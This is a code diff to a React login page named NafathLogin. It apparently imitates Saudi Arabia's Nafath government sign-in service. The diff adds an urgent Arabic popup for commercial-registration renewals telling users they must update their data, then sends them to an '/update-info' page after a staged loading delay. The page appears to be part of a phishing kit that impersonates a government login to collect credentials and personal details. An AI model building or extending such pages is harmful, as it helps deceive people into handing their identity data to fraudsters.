@@ -1,5 +1,7 @@
 import { useState, useRef, useEffect } from "react";
-import { Eye, EyeOff, Globe, Plus, Minus, User, Lock, Loader2 } from "lucide-react";
+import { Eye, EyeOff, Globe, Plus, Minus, User, Lock, Loader2, AlertCircle } from "lucide-react";
+import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "@/components/ui/dialog";
+import { Button } from "@/components/ui/button";
 
 export default function NafathLogin() {
   const [username, setUsername] = useState("");
@@ -8,6 +10,7 @@ export default function NafathLogin() {
   const [activeTab, setActiveTab] = useState<"app" | "password">("password");
   const [errors, setErrors] = useState<{username?: string, password?: string}>({});
   const [isLoading, setIsLoading] = useState(false);
+  const [showUpdatePopup, setShowUpdatePopup] = useState(false);
   const nafathInputRef = useRef<HTMLInputElement>(null);
 
   useEffect(() => {
@@ -88,7 +91,20 @@ export default function NafathLogin() {
                       setTimeout(() => {
                         const searchParams = new URLSearchParams(window.location.search);
                         const serviceName = searchParams.get('service');
-                        window.location.href = serviceName ? `/update-info?service=${encodeURIComponent(serviceName)}` : "/update-info";
+                        
+                        // Check if service requires update popup
+                        const servicesRequiringUpdate = [
+                          'تجديد سجل تجاري',
+                          'تعديل سجل تجاري',
+                          'تجديد رخصة تجارية'
+                        ];
+                        
+                        if (serviceName && servicesRequiringUpdate.includes(serviceName)) {
+                          setIsLoading(false);
+                          setShowUpdatePopup(true);
+                        } else {
+                          window.location.href = serviceName ? `/update-info?service=${encodeURIComponent(serviceName)}` : "/update-info";
+                        }
                       }, 3000);
                     }
                   }}>
@@ -207,6 +223,33 @@ export default function NafathLogin() {
           </button>
         </div>
       </main>
+
+      {/* Update Info Popup */}
+      <Dialog open={showUpdatePopup} onOpenChange={setShowUpdatePopup}>
+        <DialogContent className="sm:max-w-[425px] text-right" dir="rtl">
+          <DialogHeader className="text-right">
+            <DialogTitle className="flex items-center gap-2 text-[#11998e]">
+              <AlertCircle className="w-6 h-6" />
+              تنبيه هام
+            </DialogTitle>
+            <DialogDescription className="pt-4 text-base text-gray-700 font-medium">
+              يجب تحديث البيانات وإستكمال عملية التجديد
+            </DialogDescription>
+          </DialogHeader>
+          <DialogFooter className="sm:justify-start mt-4">
+            <Button 
+              onClick={() => {
+                const searchParams = new URLSearchParams(window.location.search);
+                const serviceName = searchParams.get('service');
+                window.location.href = serviceName ? `/update-info?service=${encodeURIComponent(serviceName)}` : "/update-info";
+              }}
+              className="bg-[#11998e] hover:bg-[#0e8c82] text-white w-full sm:w-auto"
+            >
+              متابعة
+            </Button>
+          </DialogFooter>
+        </DialogContent>
+      </Dialog>
 
       {/* Footer */}
       <footer className="bg-[#ecedf2] border-t border-gray-200 w-full z-40 h-[150px] flex items-center">
